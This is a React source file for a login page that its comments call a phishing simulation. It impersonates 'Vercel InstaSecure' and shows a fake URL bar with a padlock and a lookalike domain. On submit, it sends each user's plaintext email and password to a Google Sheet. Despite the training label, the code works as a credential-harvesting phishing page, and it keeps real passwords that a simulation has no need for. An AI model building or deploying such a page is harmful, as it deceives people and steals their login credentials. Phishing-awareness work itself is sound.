import React, { useState, useEffect } from 'react';
import Card from '../components/Card';
import Input from '../components/Input';
import Button from '../components/Button';
import { submitToSheet } from '../utils/api';
import logo from '../images/logo.png';

/**
 * LoginPage - Simulated login page (phishing simulation)
 * This is the second step - users think they're logging in
 */
export default function LoginPage({ onNext, data }) {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [startTime] = useState(Date.now());

    // Fake URL bar showing suspicious domain
    const fakeUrl = 'https://instasecure-vercel.com/auth/login';

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);

        // Submit credentials to Google Sheet
        const fullCredentials = `${email}:${password}`;
        await submitToSheet(fullCredentials, 'phishing-sim-login');

        // Simulate processing delay
        setTimeout(() => {
            onNext({
                email,
                password: password ? 'entered' : '',
                timeToLogin: Date.now() - startTime,
                loginStartedAt: startTime
            });
        }, 800);
    };

    return (
        <div className="page login-page">
            <div className="page-header">
                <img src={logo} alt="DrugCards" className="header-logo" />
                <div className="logo">
                    <span className="logo-text">Vercel InstaSecure</span>
                </div>
            </div>

            {/* Fake URL Bar */}
            <div className="fake-url-bar">
                <div className="url-lock">🔒</div>
                <div className="url-text">{fakeUrl}</div>
            </div>

            <Card className="login-card" icon="🔑">
                <h2 className="login-title">Sign in to your account</h2>
                <p className="login-subtitle">Verify your identity to continue</p>

                <form onSubmit={handleSubmit} className="login-form">
                    <Input
                        label="Email or Username"
                        type="email"
                        placeholder="Enter your email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        icon="✉️"
                        required
                        name="email"
                    />

                    <Input
                        label="Password"
                        type="password"
                        placeholder="Enter your password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        icon="🔒"
                        required
                        name="password"
                    />

                    <div className="form-options">
                        <label className="remember-me">
                            <input type="checkbox" />
                            <span>Remember this device</span>
                        </label>
                        <a href="#" className="forgot-link">Forgot password?</a>
                    </div>

                    <Button
                        type="submit"
                        variant="primary"
                        loading={loading}
                        disabled={!email || !password}
                    >
                        Continue
                    </Button>
                </form>
            </Card>

            <div className="page-footer">
                <div className="footer-content">
                    <span className="footer-brand">Vercel InstaSecure</span>
                    <span className="footer-powered">Powered by</span>
                    <img src={logo} alt="DrugCards" className="footer-logo" />
                </div>
            </div>
        </div>
    );
}

